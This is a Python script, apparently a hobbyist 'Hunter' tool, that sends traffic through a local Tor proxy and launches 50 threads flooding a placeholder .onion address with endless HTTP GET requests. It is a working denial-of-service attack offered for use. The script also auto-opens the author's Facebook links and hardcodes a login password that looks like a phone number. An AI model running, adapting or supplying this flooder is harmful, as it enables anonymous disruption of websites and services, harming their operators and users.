import os
import time
import webbrowser
import socks
import socket
import threading
import getpass
import sys

# ====== COLOR CODES ======
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
RESET = "\033[0m"

# ====== ASCII BANNER ======
print(f"""{RED}
 _   _             _            
| | | |           | |           
| |_| |_   _ _ __ | |_ ___ _ __ 
|  _  | | | | '_ \| __/ _ \ '__|
| | | | |_| | | | | ||  __/ |   
\_| |_/\__,_|_| |_|\__\___|_|   

{GREEN}
Made in MD Abdullah
{RESET}
""")

# ====== GROUP & DEVELOPER LINKS ======
print(f"""{CYAN}
Follow Group: https://www.facebook.com/groups/1164367637690003/?ref=share&mibextid=NSMWBT
(Hunter revulsion X)

Follow Developer: RJ Abdullah
Link: https://www.facebook.com/share/1ETHTUR5Tv/?mibextid=qi2Omg
{RESET}""")

# ====== Auto Open Links ======
time.sleep(1)
webbrowser.open("https://www.facebook.com/groups/1164367637690003/?ref=share&mibextid=NSMWBT")
webbrowser.open("https://www.facebook.com/share/1ETHTUR5Tv/?mibextid=qi2Omg")

# ============== USER AUTH ==============
correct_username = "abdullah"
correct_password = "+8801337411771"

print(f"{CYAN}\n=== Secure Access Required ==={RESET}")
username = input("Enter username: ")
password = getpass.getpass("Enter password: ")

if username != correct_username or password != correct_password:
    print(f"{RED}Access Denied! Invalid credentials.{RESET}")
    sys.exit(1)

# ============== SETTINGS ==============
target_host = "exampleonionaddress.onion"  # <- Dummy onion address
target_port = 80
threads = 50
delay = 0.5  # seconds between requests

# ====== Set Tor Proxy ======
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

# ============== ATTACK FUNCTION ==============
def attack():
    while True:
        try:
            s = socket.socket()
            s.connect((target_host, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + bytes(target_host, 'utf-8') + b"\r\n\r\n")
            print(f"{GREEN}[✓] Sent request to {target_host}{RESET}")
            s.close()
            time.sleep(delay)
        except Exception as e:
            print(f"{RED}[x] Error: {e}{RESET}")

# ============== THREADS ==============
print(f"{GREEN}[*] Authentication successful. Starting attack threads...{RESET}")
for i in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

input(f"\n{CYAN}Press ENTER to stop...{RESET}\n")
